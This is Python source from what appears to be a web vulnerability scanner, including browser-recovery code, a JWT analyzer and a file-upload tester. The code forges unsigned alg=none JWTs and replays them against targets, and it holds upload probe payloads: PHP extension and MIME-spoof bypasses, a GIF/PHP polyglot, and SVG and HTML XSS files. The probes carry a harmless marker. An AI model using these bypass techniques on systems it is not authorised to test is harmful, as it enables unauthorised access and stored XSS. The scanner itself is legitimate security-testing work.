
async def _heartbeat_keeper(interval: float = 30.0) -> None:
    """Background heartbeat writer — keeps heartbeat.json fresh during ANY
    scan phase, not just active fuzzing.

    WHY THIS EXISTS:
    Originally heartbeats were written ONLY inside active_scan (one per
    test). That meant every OTHER long phase starved the heartbeat:
      - LLM vulnerability analysis (can be 150+ findings × an LLM call each)
      - LLM pre-scan planner + executive summary (single slow LLM calls)
      - source-code analysis, interesting-locations, directory brute-force
    Once such a phase exceeded the supervisor's threshold (default 180s),
    the supervisor killed the scanner and restarted it — but those phases
    weren't checkpointed, so the restart re-ran them, exceeded the
    threshold again, and got killed again... an infinite kill/restart
    loop that presented to the user as "the scan freezes and never
    finishes." This keeper breaks that loop by keeping the heartbeat fresh
    for the whole scan.

    SAFETY — does this defeat the supervisor's freeze detection?
    No. This is an asyncio task, so it only runs when the event loop is
    alive. The case the supervisor exists for — Playwright's C code
    blocking the event loop so the scanner is truly wedged — also blocks
    this keeper (it can't fire with the loop stopped). So the heartbeat
    still goes stale on a real freeze → supervisor kills → correct. The
    keeper only prevents the FALSE "stale" kills during legitimate slow
    phases where the loop is alive (e.g. awaiting LLM HTTP responses).

    Exits when: stop_event is set (interrupt), or scan_completed.marker
    appears (normal completion), so it never outlives the scan.
    """
    while not GLOBAL_STATE.stop_event.is_set():
        # Normal completion: the scanner writes scan_completed.marker at the
        # very end of run_scan. Once it exists, stop keeping the heartbeat.
        if _GLOBAL_HEARTBEAT_PATH is not None:
            try:
                if (_GLOBAL_HEARTBEAT_PATH.parent / "scan_completed.marker").exists():
                    return
            except Exception:
                pass
        phase = getattr(GLOBAL_STATE, "current_phase", None) or "running"
        try:
            _write_heartbeat(0, 0, phase=phase)
        except Exception:
            pass  # best-effort
        # Sleep `interval`, but wake immediately if stop_event gets set.
        try:
            await asyncio.wait_for(
                GLOBAL_STATE.stop_event.wait(), timeout=interval)
        except asyncio.TimeoutError:
            pass  # normal — interval elapsed, loop and write again
        except Exception:
            return


async def _ensure_alive_page(
    page: Any,
    context: Any,
    browser: Any,
    target_url: str,
    logger: Any,
    saved_cookies: Any = None,
    tag: str = "phase",
) -> tuple:
    """Health-check the page; if dead, recreate page / context / browser.

    Returns a tuple `(page, context, browser)` that the caller MUST
    re-bind to its own local variables. Whatever was passed in may be
    stale after this call.

    Recovery ladder (each step is tried in order, falling through on failure):

      1. page.content() with 5s timeout
         → if it succeeds, page is alive → return as-is.
      2. context.new_page() with 5s timeout
         → if it succeeds, navigate to target_url, return new page.
      3. Full Playwright restart:
         - pkill Chrome (chromium / chrome / headless / chrome-headless-shell
           / remote-debugging-pipe)
         - 3s sleep for OS cleanup
         - GLOBAL_STATE.playwright_ctx.stop() with 3s timeout (best-effort)
         - Re-`start()` a fresh Playwright
         - Re-launch Chromium
         - Re-create BrowserContext (restoring cookies if provided)
         - Re-create Page, navigate to target_url

    The full restart is the only thing that reliably recovers from
    "Target page, context or browser has been closed" — once the
    context is closed, `context.new_page()` also fails, so we must
    rebuild the entire stack from GLOBAL_STATE.

    Args:
        page:        current Page (may be dead).
        context:     current BrowserContext (may be dead).
        browser:     current Browser (may be dead).
        target_url:  URL to navigate the new page to (so the next phase
                     has a working page already loaded).
        logger:      the JSON logger (for the execution trail).
        saved_cookies: cookies to restore into the new context
                     (list of Playwright cookie dicts). If None, no
                     cookies are restored.
        tag:         short label prepended to log messages so the
                     engineer can see WHICH phase triggered the recovery.

    Returns:
        (page, context, browser) — re-bind your locals to these.
    """
    # --- Step 1: is the page alive? ---
    if page is not None:
        try:
            await asyncio.wait_for(page.content(), timeout=5.0)
            return page, context, browser  # alive — nothing to do
        except Exception:
            logger.log(tag, "page is dead — attempting recovery")

    # --- Step 2: try context.new_page() (cheap path) ---
    if context is not None:
        try:
            new_page = await asyncio.wait_for(context.new_page(), timeout=5.0)
            await _pw(new_page.goto, target_url,
                      wait_until="domcontentloaded",
                      timeout=15000, default=None)
            logger.log(tag, "page recreated from existing context")
            return new_page, context, browser
        except Exception as e:
            logger.log(tag, f"context.new_page() failed: {type(e).__name__}: {e} — full restart required")

    # --- Step 3: full Playwright restart ---
    try:
        import subprocess as _sp_rec
        _sp_rec.run(
            "pkill -9 -f chromium; pkill -9 -f chrome; pkill -9 -f headless; "
            "pkill -9 -f chrome-headless-shell; pkill -9 -f remote-debugging-pipe",
            shell=True, timeout=5, capture_output=True,
        )
        await asyncio.sleep(3.0)  # OS cleanup

        # Stop the old Playwright (best-effort — it may already be dead)
        try:
            if GLOBAL_STATE.playwright_ctx is not None:
                try:
                    await asyncio.wait_for(
                        GLOBAL_STATE.playwright_ctx.stop(), timeout=3.0)
                except Exception:
                    pass
        except Exception:
            pass

        # Start a fresh Playwright + browser + context + page
        from playwright.async_api import async_playwright as _apw_rec
        pw = await _apw_rec().start()
        GLOBAL_STATE.playwright_ctx = pw

        new_browser = await asyncio.wait_for(
            pw.chromium.launch(
                headless=True,
                args=["--no-sandbox",
                      "--disable-background-timer-throttling",
                      "--disable-renderer-backgrounding",
                      "--disable-background-networking"],
            ),
            timeout=15.0,
        )
        GLOBAL_STATE.browser = new_browser

        new_context = await asyncio.wait_for(
            new_browser.new_context(
                user_agent=("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
                viewport={"width": 1280, "height": 720},
                ignore_https_errors=True,
            ),
            timeout=10.0,
        )

        if saved_cookies:
            try:
                await asyncio.wait_for(
                    new_context.add_cookies(saved_cookies), timeout=5.0)
            except Exception:
                pass

        new_page = await asyncio.wait_for(new_context.new_page(), timeout=5.0)
        await _pw(new_page.goto, target_url,
                  wait_until="domcontentloaded",
                  timeout=15000, default=None)
        # Verify the page actually works (catches zombie browsers that
        # launched but immediately died).
        await asyncio.wait_for(new_page.content(), timeout=3.0)

        logger.log(tag, f"browser + context + page fully recreated "
                        f"({len(saved_cookies or [])} cookies restored)")
        return new_page, new_context, new_browser
    except Exception as e:
        logger.log(tag, f"full page recreation FAILED: {type(e).__name__}: {e} "
                        f"— subsequent phases may fail")
        # Return whatever we have — the caller will likely log warnings
        # but won't crash. The next phase's _pw() calls will return defaults.
        return page, context, browser


# Sentinel for "no default provided" — distinguishes _pw(f) from _pw(f, default=None)
_PW_NO_DEFAULT = object()


# ============================================================================
# SECTION 12.5 — JWT ANALYZER (A07:2025 Authentication Failures)
# ============================================================================
#
# Two checks, both offline against captured tokens:
#   1. WEAK/MISSING CLAIMS (passive, always runs): decode each captured JWT
#      and flag missing exp, missing sub, very-long expiry, alg=none already
#      present, or an empty/missing signature segment.
#   2. alg=none BYPASS (forge + replay, only when the scan is authenticated):
#      re-encode the header with alg="none" + empty signature, replay a
#      request carrying the forged token where the original was (cookie or
#      Authorization header), and flag High if the server accepts it.
#
# Tokens are COLLECTED during passive_scan (cookies + page HTML + Authorization
# headers) and saved to jwt_tokens.json; this analyzer reads that file so the
# analysis phase is decoupled from collection (and survives resume).

# Match a compact JWT: header.payload.signature, each segment base64url.
# The signature segment may be empty (alg=none tokens). We require the two
# "eyJ" prefixes (base64url-encoded '{"...' or similar) as a cheap filter.
JWT_TOKEN_RE = re.compile(
    r"\beyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*\b"
)


def _jwt_b64url_decode(seg: str) -> Optional[Dict[str, Any]]:
    """Base64url-decode one JWT segment and parse as JSON. None on failure."""
    try:
        padding = "=" * (-len(seg) % 4)
        raw = base64.urlsafe_b64decode(seg + padding)
        return json.loads(raw)
    except Exception:
        return None


def jwt_decode(token: str) -> Optional[Dict[str, Any]]:
    """Split a JWT into {header, payload, signature}. None if malformed."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header = _jwt_b64url_decode(parts[0])
    payload = _jwt_b64url_decode(parts[1])
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return {"header": header, "payload": payload, "signature": parts[2]}


def jwt_forge_alg_none(token: str) -> Optional[str]:
    """Return a copy of `token` with alg="none" and an empty signature.

    A server that accepts this forged token is vulnerable to the classic
    alg=none bypass. Returns None if the original token can't be decoded.
    """
    decoded = jwt_decode(token)
    if not decoded:
        return None
    header = dict(decoded["header"])
    header["alg"] = "none"
    header.pop("kid", None)  # strip key id — we're claiming no signature
    try:
        h_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(",", ":")).encode("utf-8")
        ).rstrip(b"=").decode("ascii")
        p_b64 = base64.urlsafe_b64encode(
            json.dumps(decoded["payload"], separators=(",", ":")).encode("utf-8")
        ).rstrip(b"=").decode("ascii")
        return f"{h_b64}.{p_b64}."
    except Exception:
        return None


def jwt_claim_issues(payload: Dict[str, Any], header: Dict[str, Any]) -> List[Tuple[str, str]]:
    """Return [(severity, description), ...] of weak/missing-claim issues.

    Pure offline analysis — no verification, no network. Conservative: only
    flags things that are genuinely weak config, not style preferences.
    """
    issues: List[Tuple[str, str]] = []
    alg = str(header.get("alg", "")).lower()
    # alg=none present in a token the server actually issued = critical.
    if alg == "none":
        issues.append(("High",
                       "Token uses alg=\"none\" (no signature). If the server "
                       "issued this, signature verification is disabled."))
    # Missing expiration → token valid forever.
    if "exp" not in payload:
        issues.append(("High",
                       "Token has no 'exp' claim — once issued it never expires "
                       "(no automatic session timeout)."))
    else:
        try:
            exp = int(payload["exp"])
            now = int(time.time())
            if exp > now + (365 * 86400):
                issues.append(("Medium",
                               f"Token 'exp' is >1 year out "
                               f"({(exp - now) // 86400} days) — excessively long lifetime."))
        except (ValueError, TypeError):
            issues.append(("Low", "Token 'exp' claim is not a valid integer."))
    # Missing subject — weak identity binding.
    if "sub" not in payload:
        issues.append(("Low",
                       "Token has no 'sub' claim — the bearer identity isn't "
                       "bound to the token (harder to audit/revoke)."))
    return issues


class JWTAnalyzer:
    """Offline JWT security analysis (weak claims + alg=none forge/replay)."""

    def __init__(self, logger: "ExecutionTrailLogger", evidence_dir: Path) -> None:
        self.logger = logger
        self.evidence_dir = evidence_dir

    def analyze_claims(self, tokens: List[Dict[str, Any]]) -> List[Finding]:
        """Passive: decode each token, flag weak/missing claims. Always runs."""
        findings: List[Finding] = []
        seen_token_hashes: set = set()
        for entry in tokens:
            token = entry.get("token", "")
            if not token:
                continue
            # Dedupe identical tokens (same token in many responses).
            if token in seen_token_hashes:
                continue
            seen_token_hashes.add(token)
            decoded = jwt_decode(token)
            if not decoded:
                continue
            for severity, desc in jwt_claim_issues(decoded["payload"], decoded["header"]):
                test_id = uuid.uuid4().hex[:12]
                masked = token[:12] + "..." + (token[-6:] if len(token) > 18 else "")
                findings.append(Finding(
                    finding_id=test_id,
                    owasp_category="A07:2025 Authentication Failures",
                    title=f"JWT weakness ({desc.split('—')[0].split('(')[0].strip()})",
                    severity=severity,
                    url=entry.get("url", ""),
                    payload=f"JWT analyzed: {masked}",
                    request_raw=f"# Token captured from {entry.get('source', '?')} " +
                                f"on {entry.get('url', '')}\n# header: " +
                                json.dumps(decoded["header"]) +
                                f"\n# payload: {json.dumps(decoded['payload'])}",
                    response_raw=desc,
                    execution_trail=[
                        f"[JWT] Captured from {entry.get('source', 'unknown')}",
                        f"[JWT] Algorithm: {decoded['header'].get('alg', '?')}",
                        f"[JWT] Issue: {desc}",
                    ],
                    patterns_matched=[f"JWT:{desc.split(' ')[0].lower()}"],
                ))
        self.logger.log("jwt_claims_done",
                        f"analyzed {len(seen_token_hashes)} unique tokens, "
                        f"{len(findings)} claim issues")
        return findings

    async def analyze_alg_none(
        self,
        page: Any,
        target_url: str,
        tokens: List[Dict[str, Any]],
        rate_limiter: "RateLimiter",
    ) -> List[Finding]:
        """Active: forge alg=none tokens and replay. Only meaningful when the
        scan is authenticated. Best-effort — never raises, never blocks long.
        """
        findings: List[Finding] = []
        tested: set = set()
        for entry in tokens:
            token = entry.get("token", "")
            source = entry.get("source", "")
            url = entry.get("url", "") or target_url
            if not token or token in tested:
                continue
            tested.add(token)
            decoded = jwt_decode(token)
            if not decoded:
                continue
            # Only HS*/RS* tokens are worth forging to "none". Skip tokens
            # that are already alg=none.
            alg = str(decoded["header"].get("alg", "")).lower()
            if alg == "none":
                continue
            forged = jwt_forge_alg_none(token)
            if not forged:
                continue
            # Replay: place the forged token where the original was and hit a
            # protected URL. Determine placement by source.
            try:
                async with rate_limiter.slot():
                    if source == "header":
                        # Authorization: Bearer <forged>
                        resp = await asyncio.wait_for(
                            page.context.request.get(
                                url,
                                headers={"Authorization": f"Bearer {forged}"},
                                timeout=10000, max_redirects=0,
                            ),
                            timeout=15.0,
                        )
                    else:
                        # Cookie-carried token: set the cookie on the context
                        # then fetch. We need the cookie name — store it in the
                        # entry when collecting.
                        cookie_name = entry.get("cookie_name", "token")
                        try:
                            await page.context.add_cookies([{
                                "name": cookie_name, "value": forged,
                                "domain": urlparse(url).hostname or "",
                                "path": "/", "secure": False, "httpOnly": False,
                            }])
                        except Exception:
                            pass
                        resp = await asyncio.wait_for(
                            page.context.request.get(url, timeout=10000, max_redirects=0),
                            timeout=15.0,
                        )
                status = resp.status
            except Exception as e:
                self.logger.log("jwt_alg_none",
                                f"replay failed for {url}: {e}")
                continue
            # If the forged (unsigned) token is accepted (200), that's the bypass.
            if status == 200:
                test_id = uuid.uuid4().hex[:12]
                findings.append(Finding(
                    finding_id=test_id,
                    owasp_category="A07:2025 Authentication Failures",
                    title=f"JWT alg=none bypass accepted (token from {source})",
                    severity="High",
                    url=url,
                    payload=f"Forged alg=none JWT accepted (HTTP 200)",
                    request_raw=f"# Original token (alg={alg}) from {source} on {url}\n{token}\n"
                                f"# Forged alg=none token:\n{forged}",
                    response_raw=f"Server returned HTTP {status} for the forged "
                                 f"(unsigned) token — signature verification is bypassable.",
                    execution_trail=[
                        f"[JWT] Captured {alg} token from {source}",
                        "[JWT] Forged alg=none variant (empty signature)",
                        f"[JWT] Replayed against {url}",
                        f"[JWT] Server returned {status} — alg=none accepted",
                    ],
                    patterns_matched=["JWT:alg_none_bypass"],
                ))
                self.logger.log("jwt_alg_none_hit",
                                f"alg=none BYPASS confirmed on {url} (status={status})")
            else:
                self.logger.log("jwt_alg_none",
                                f"alg=none rejected on {url} (status={status}) — not vulnerable")
        return findings


# ============================================================================
# SECTION 8.8.6 — FILE UPLOAD TESTER (Unrestricted / Dangerous Upload)
# ============================================================================
#
# Tests every discovered <input type="file"> for unrestricted-upload flaws:
# the server accepting a dangerous file type (PHP webshell, SVG/HTML for
# stored XSS) or accepting a file whose declared Content-Type / extension
# has been spoofed to bypass naive validation.
#
# HOW IT WORKS:
#   1. For each file input in the attack surface, navigate to its form page.
#   2. For each probe (extension bypass / MIME spoof / polyglot / XSS / benign
#      baseline), use Playwright set_input_files() with a synthetic file
#      {name, mimeType, buffer} — this lets us control BOTH the filename and
#      the declared Content-Type independently (the key to MIME-spoof tests).
#   3. Submit the form (click submit / Enter / JS submit) and capture the
#      upload response (status + body + headers).
#   4. Detect: did the server ACCEPT it (2xx + filename reflected or a
#      landing URL discoverable)? Extract the landing URL where the uploaded
#      file can be reached (for manual verification).
#   5. Emit a Finding (A05:2025 Injection) when a DANGEROUS probe is accepted.
#      The full table of every attempt (accepted AND rejected) + landing URLs
#      is written to file_uploads.json for the dedicated Uploads tab.
#
# HONEST LIMITATIONS (see README "Out of Scope"):
#   - We do NOT fetch the landing URL or execute the file to confirm RCE.
#     Every finding is UNVERIFIED — the engineer clicks the landing URL.
#   - If the server accepts the file but returns no reflected filename and no
#     discoverable URL, the probe is marked rejected/unclear (blind-upload
#     under-reporting).
#   - Validation that inspects CONTENT (AV scan, deep magic-byte allowlist)
#     is not bypassed by these declaration-level tricks.
#
# All probes carry a harmless marker string ("WR-UPLOAD-OK") so the engineer
# can grep for them and so the uploaded content is never actually malicious.

# (probe_id, extension, declared_mime, content_bytes, severity_if_accepted,
#  owasp_category, rationale)
FILE_UPLOAD_PROBES: List[Tuple[str, str, str, bytes, str, str, str]] = [
    # --- Extension bypass: upload a PHP file under various extensions. ---
    ("ext_php", ".php", "application/x-php",
     b"<?php echo 'WR-UPLOAD-OK'; ?>",
     "High", "A05:2025 Injection", "PHP file accepted (webshell potential)"),
    ("ext_phtml", ".phtml", "application/x-httpd-php",
     b"<?php echo 'WR-UPLOAD-OK'; ?>",
     "High", "A05:2025 Injection", ".phtml extension accepted"),
    ("ext_php5", ".php5", "application/x-php",
     b"<?php echo 'WR-UPLOAD-OK'; ?>",
     "High", "A05:2025 Injection", ".php5 extension accepted"),
    # Double extension + null byte — bypass naive "ends with .jpg" checks.
    ("ext_php_jpg", ".php.jpg", "image/jpeg",
     b"\xff\xd8\xff\xe0" + b"<?php echo 'WR-UPLOAD-OK'; ?>",
     "High", "A05:2025 Injection", "double extension .php.jpg accepted"),
    ("ext_php_null", ".php%00.jpg", "image/jpeg",
     b"\xff\xd8\xff\xe0" + b"<?php echo 'WR-UPLOAD-OK'; ?>",
     "High", "A05:2025 Injection", "null-byte .php%00.jpg accepted"),
    # --- MIME spoof: a .php file declared as image/jpeg. ---
    ("mime_spoof_php", ".php", "image/jpeg",
     b"<?php echo 'WR-UPLOAD-OK'; ?>",
     "High", "A05:2025 Injection", "PHP file accepted with spoofed image MIME"),
    # --- Magic-byte polyglot: GIF89a header + PHP, defeats getimagesize(). ---
    ("polyglot_gif", ".php", "image/gif",
     b"GIF89a<?php echo 'WR-UPLOAD-OK'; ?>",
     "High", "A05:2025 Injection", "GIF/PHP polyglot accepted"),
    # --- Stored XSS via uploaded SVG / HTML. ---
    ("svg_xss", ".svg", "image/svg+xml",
     b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>"
     b"<text>WR-UPLOAD-OK</text></svg>",
     "Medium", "A05:2025 Injection", "SVG with onload XSS accepted"),
    ("html_xss", ".html", "text/html",
     b"<script>alert(1)</script><!-- WR-UPLOAD-OK -->",
     "Medium", "A05:2025 Injection", "HTML with <script> accepted (stored XSS)"),
    # --- Benign baseline: a plain .txt. Control row — no Finding emitted. ---
    ("txt_benign", ".txt", "text/plain",
     b"WR-UPLOAD-OK",
     "Info", "", "benign baseline (control; no finding even if accepted)"),
]

# Regex helpers for landing-URL extraction (applied to the upload response).
# We look for the uploaded filename / base name appearing inside a URL-ish
# context, or a JSON field that commonly carries the stored path.
_FU_URL_RE = re.compile(r"https?://[^\s\"'<>]+", re.IGNORECASE)
_FU_PATH_RE = re.compile(r"(?:/[\w.\-]+)+/[\w.\-]*", re.IGNORECASE)
_FU_JSON_FIELD_RE = re.compile(
    r'"(?:url|path|location|file|link|src|href|filename|dest|destination)"\s*:\s*"([^"]+)"',
    re.IGNORECASE,
)
# Common upload directories — used to construct best-effort candidate URLs
# when no landing URL is reflected (marked "candidate", unverified).
_FU_UPLOAD_DIRS = (
    "/uploads/", "/upload/", "/files/", "/media/",
    "/assets/uploads/", "/static/uploads/", "/img/uploads/", "/images/",
)


class FileUploadTester:
    """Tests <input type=file> endpoints for unrestricted/dangerous uploads.

    Browser-driven (Playwright ``set_input_files`` + real form submit) so it
    reuses the logged-in session, CSRF tokens, and hidden fields. Emits a
    Finding (A05:2025 Injection) per accepted dangerous probe and writes the
    full attempt table (with landing URLs) to ``file_uploads.json`` for the
    Uploads tab.
    """

    def __init__(
        self,
        rate_limiter: "RateLimiter",
        logger: "ExecutionTrailLogger",
        evidence_dir: Path,
        base_filename: str = "webrecon_upload",
        output_dir: Optional[Path] = None,
    ) -> None:
        self.rate_limiter = rate_limiter
        self.logger = logger
        self.evidence_dir = evidence_dir
        # Where to write file_uploads.json (the scan output dir). Falls back
        # to the parent of evidence_dir (same place findings.json lives).
        self.output_dir = output_dir or evidence_dir.parent
        # Sanitize the base filename — it becomes part of real filenames on
        # the target, so strip path separators / null bytes / whitespace.
        base = "".join(
            c for c in (base_filename or "webrecon_upload")
            if c.isalnum() or c in ("_", "-", ".")
        )
        self.base_filename = base or "webrecon_upload"

    # ------------------------------------------------------------------
    # Landing-URL extraction
    # ------------------------------------------------------------------
    def _extract_landing_urls(
        self,
        filename: str,
        body: str,
        headers: Dict[str, Any],
        target_url: str,
    ) -> Tuple[List[str], List[str]]:
        """Return ``(landing_urls, candidate_urls)`` discovered in the response.

        ``landing_urls`` = URLs/paths found reflected in the response (stronger
        signal). ``candidate_urls`` = best-effort guesses under common upload
        dirs (weaker — marked "candidate" in the UI; the engineer must confirm).
        """
        from urllib.parse import urljoin

        base = self.base_filename
        # The response body + the Location header are both fair game.
        text = (body or "") + "\n" + str(headers.get("location", "") or "")
        found: List[str] = []

        # Absolute URLs containing the uploaded filename.
        for m in _FU_URL_RE.finditer(text):
            u = m.group(0).rstrip(".,);]'\"")
            if base in u or filename in u:
                found.append(u)
        # Bare paths containing the filename — resolve against the target.
        # NB: mask absolute-URL spans first, otherwise this regex re-matches
        # the /host/path substring INSIDE an absolute URL and we resolve it
        # again into a garbled URL (https://host/host/path/...).
        masked = _FU_URL_RE.sub(" ", text)
        for m in _FU_PATH_RE.finditer(masked):
            p = m.group(0)
            if base in p or filename in p:
                try:
                    found.append(urljoin(target_url + "/", p))
                except Exception:
                    pass
        # JSON fields that commonly carry the stored path.
        for m in _FU_JSON_FIELD_RE.finditer(text):
            val = m.group(1)
            if base in val or filename in val or val.endswith(filename):
                if val.startswith(("http://", "https://")):
                    found.append(val)
                else:
                    try:
                        found.append(urljoin(target_url + "/", val))
                    except Exception:
                        pass
        # Location header (redirect after upload) if it points at the file.
        loc = str(headers.get("location", "") or "")
        if loc and (base in loc or filename in loc):
            if loc.startswith(("http://", "https://")):
                found.append(loc)
            else:
                try:
                    found.append(urljoin(target_url + "/", loc))
                except Exception:
                    pass

        # Dedup, drop empties.
        seen: set = set()
        landing: List[str] = []
        for u in found:
            if u and u not in seen:
                seen.add(u)
                landing.append(u)

        # Candidate guesses (only when nothing concrete was found).
        candidates: List[str] = []
        if not landing:
            for d in _FU_UPLOAD_DIRS:
                try:
                    candidates.append(urljoin(target_url + "/", d + filename))
                except Exception:
                    pass

        return landing, candidates

    # ------------------------------------------------------------------
    # Form submission + response capture
    # ------------------------------------------------------------------
    async def _submit_and_capture(
        self,
        page: Page,
        action_url: str,
    ) -> Tuple[int, Dict[str, Any], str]:
        """Submit the active form and capture the upload response.

        Returns ``(status, headers, body)``. ``status=0`` means we could not
        capture the POST response (the form may GET, or the wait timed out);
        in that case we fall back to reading the rendered DOM as the body.
        """
        status = 0
        headers: Dict[str, Any] = {}
        body = ""
        # Locate a submit button (global selector — mirrors the active
        # scanner; pages typically have a single upload form).
        submit_btn = await _pw(
            page.query_selector,
            "button[type=submit], input[type=submit], button:not([type])",
            default=None,
        )
        try:
            # expect_response sets up the listener BEFORE the click fires —
            # the submit must happen inside the `async with` block.
            async with page.expect_response(
                lambda r: r.request.method == "POST", timeout=12000,
            ) as resp_info:
                if submit_btn is not None:
                    await _pw(submit_btn.click, no_wait_after=True, default=None)
                else:
                    await _pw(page.keyboard.press, "Enter", default=None)
            response = await resp_info.value
            status = response.status
            try:
                headers = dict(response.headers)
            except Exception:
                headers = {}
            try:
                body = await response.text()
            except Exception:
                body = ""
        except Exception as e:
            # No POST response observed (form may GET, or timed out). Fall
            # back to reading the rendered DOM after the submit attempt.
            self.logger.log("file_upload",
                            f"no POST response captured for {action_url}: "
                            f"{type(e).__name__}; falling back to DOM read")
            if submit_btn is None:
                # Last resort: a JS form.submit(), then read the page.
                try:
                    await _pw(page.evaluate,
                              "() => { const f = document.querySelector('form'); "
                              "if (f) f.submit(); }",
                              default=None)
                except Exception:
                    pass
            try:
                await _pw(page.wait_for_load_state, "domcontentloaded",
                          timeout=10000, default=None)
            except Exception:
                pass
            try:
                body = await _pw(page.content, default="")
            except Exception:
                body = ""
        return status, headers, body

    # ------------------------------------------------------------------
    # Main entry point
    # ------------------------------------------------------------------
    async def test(
        self,
        page: Page,
        attack_surface: List["InputField"],
        target_url: str,
    ) -> List[Finding]:
        """Run file-upload probes against every ``<input type=file>`` found.

        Returns security Findings (accepted dangerous uploads). Also writes
        ``file_uploads.json`` (the full attempt table, for the Uploads tab).
        """
        findings: List[Finding] = []
        upload_rows: List[Dict[str, Any]] = []

        file_inputs = [inp for inp in attack_surface
                       if (inp.input_type or "").lower() == "file"]
        if not file_inputs:
            self.logger.log("file_upload_skip",
                            "no <input type=file> in attack surface; skipping")
            # Still write an empty table so the UI tab resolves cleanly.
            try:
                (self.output_dir / "file_uploads.json").write_text(
                    json.dumps([], indent=2, ensure_ascii=False),
                    encoding="utf-8")
            except Exception:
                pass
            return findings

        self.logger.log("file_upload_start",
                        f"testing {len(file_inputs)} file input(s) with "
                        f"{len(FILE_UPLOAD_PROBES)} probes; "
                        f"base_filename={self.base_filename}")

        for inp in file_inputs:
            if GLOBAL_STATE.stop_event.is_set():
                break
            # A file input may legitimately have no name — fall back to a
            # selector by type. Prefer name; else first file input on page.
            selector = f"input[name='{inp.name}']" if inp.name else "input[type=file]"
            form_url = inp.url or target_url

            for probe_id, ext, mime, content, sev, owasp, rationale in FILE_UPLOAD_PROBES:
                if GLOBAL_STATE.stop_event.is_set():
                    break
                filename = f"{self.base_filename}{ext}"
                async with self.rate_limiter.slot():
                    test_id = uuid.uuid4().hex[:12]
                    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
                    # Navigate to the form page (fresh each probe).
                    try:
                        await _pw(page.goto, form_url, wait_until="domcontentloaded",
                                  timeout=15000, default=None)
                    except Exception as e:
                        self.logger.log("file_upload",
                                        f"goto failed for {form_url}: {e}")
                        continue
                    # Locate the file input.
                    elem = await _pw(page.query_selector, selector, default=None)
                    if elem is None:
                        self.logger.log("file_upload",
                                        f"file input '{selector}' not found on "
                                        f"{form_url}; skipping")
                        continue
                    # Attach the synthetic file (controls filename + MIME).
                    try:
                        await _pw(elem.set_input_files,
                                  {"name": filename, "mimeType": mime,
                                   "buffer": content},
                                  default=None)
                    except Exception as e:
                        self.logger.log("file_upload",
                                        f"set_input_files failed for {filename}: {e}")
                        continue
                    # Submit + capture the response.
                    status, headers, body = await self._submit_and_capture(page, form_url)
                    rendered = ""
                    try:
                        rendered = await _pw(page.content, default="")
                    except Exception:
                        rendered = ""
                    combined_body = (body or "") + "\n" + (rendered or "")

                    # --- Detection (unverified, evidence-first) ---
                    filename_reflected = (self.base_filename in combined_body
                                          or filename in combined_body)
                    landing, candidates = self._extract_landing_urls(
                        filename, combined_body, headers, target_url)
                    accepted = (status in (200, 201)) and (filename_reflected or bool(landing))
                    # If we couldn't capture status but the filename is
                    # clearly reflected, treat as accepted (best-effort).
                    if status == 0 and (filename_reflected or bool(landing)):
                        accepted = True

                    # Screenshot at the moment after submit.
                    screenshot_path: Optional[str] = None
                    try:
                        ss_path = self.evidence_dir / f"{ts}_{test_id}_upload.png"
                        await _pw(page.screenshot, path=str(ss_path),
                                  full_page=True, default=None)
                        screenshot_path = str(ss_path)
                    except Exception:
                        pass

                    # Every probe is dangerous except the benign baseline.
                    is_dangerous = probe_id != "txt_benign"

                    self.logger.log(
                        "file_upload_result",
                        f"probe={probe_id} file={filename} mime={mime} "
                        f"input={form_url} status={status} "
                        f"reflected={filename_reflected} accepted={accepted} "
                        f"landing={landing[:1]}",
                    )

                    # Row for the Uploads tab (EVERY attempt — accepted + rejected).
                    upload_rows.append({
                        "probe_id": probe_id,
                        "filename": filename,
                        "mime_sent": mime,
                        "content_desc": rationale,
                        "input_url": form_url,
                        "input_name": inp.name,
                        "http_status": status,
                        "accepted": accepted,
                        "filename_reflected": filename_reflected,
                        "landing_urls": landing,
                        "candidate_urls": candidates,
                        "response_preview": combined_body[:500],
                        "screenshot": (os.path.basename(screenshot_path)
                                       if screenshot_path else None),
                        "severity": sev,
                        "owasp": owasp,
                        "rationale": rationale,
                    })

                    # Security Finding ONLY for accepted dangerous probes.
                    if accepted and is_dangerous:
                        trail = [
                            f"[Upload] Navigated to {form_url}",
                            f"[Upload] Attached {filename} (declared MIME {mime}) "
                            f"to input '{inp.name or '(unnamed)'}'",
                            f"[Upload] Submitted form; server returned HTTP {status}",
                            f"[Upload] Filename reflected: {filename_reflected}; "
                            f"landing URLs: {landing or candidates or 'none found'}",
                            "[Upload] Finding recorded as UNVERIFIED — open the "
                            "landing URL in the Uploads tab to confirm.",
                        ]
                        findings.append(Finding(
                            finding_id=test_id,
                            owasp_category=owasp,
                            title=(f"Potential Unrestricted File Upload: "
                                   f"{filename} accepted ({probe_id})"),
                            severity=sev,
                            url=form_url,
                            payload=f"{filename} (declared Content-Type: {mime})",
                            request_raw=(
                                f"POST {form_url}\n"
                                f"Content-Type: multipart/form-data\n"
                                f"File field: {inp.name or '(unnamed)'}\n"
                                f"Uploaded filename: {filename}\n"
                                f"Declared MIME: {mime}\n"
                                f"Content ({len(content)} bytes): {content[:120]!r}"
                            ),
                            response_raw=(
                                f"Status: {status}\n"
                                f"Location: {headers.get('location', '(none)')}\n\n"
                                f"{combined_body[:2000]}"
                            ),
                            execution_trail=trail,
                            screenshot_path=screenshot_path,
                            patterns_matched=[f"FileUpload:{probe_id}"],
                            unverified=True,
                        ))

        # Persist the full attempt table for the Uploads tab.
        try:
            (self.output_dir / "file_uploads.json").write_text(
                json.dumps(upload_rows, indent=2, ensure_ascii=False, default=str),
                encoding="utf-8",
            )
        except Exception as e:
            self.logger.log("file_upload",
                            f"failed to write file_uploads.json: {e}")

        self.logger.log("file_upload_done",
                        f"tested {len(file_inputs)} input(s); "
                        f"{len(findings)} accepted-dangerous finding(s), "
                        f"{len(upload_rows)} total attempts logged")
        return findings


class OWASPScanner:
    """Passive + active security checks aligned to OWASP Top 10 (2025)."""

    # --- Session expiry detection patterns ---
    # These match login page indicators in HTML responses only.
    # We do NOT check JS/CSS/JSON responses (they may contain 'login'
    # in strings without being an actual login page redirect).
